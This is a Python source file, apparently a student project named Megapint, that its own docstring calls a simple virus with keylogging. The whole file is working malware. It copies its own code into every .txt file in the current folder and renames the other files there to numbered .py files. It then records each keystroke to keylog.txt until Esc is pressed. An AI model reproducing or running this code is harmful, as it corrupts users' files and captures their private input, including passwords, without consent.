#!/usr/bin/env python3

""" Implementation of simple virus in Python that infects files and keyloggs the user keyboard. """
import os
import sys
import re
import glob
from pynput.keyboard import Key, Listener

#Start execution
class Megapint:
    def __init__(self):
        self.counter = 0
        self.keys = []
    # Init Virus Infect
    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def init_virus_infection(self):
        virus_code = [] # lista que recebe o codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")

        virus_file.close() # fecha o ficheiro
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.init_virus_infection()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
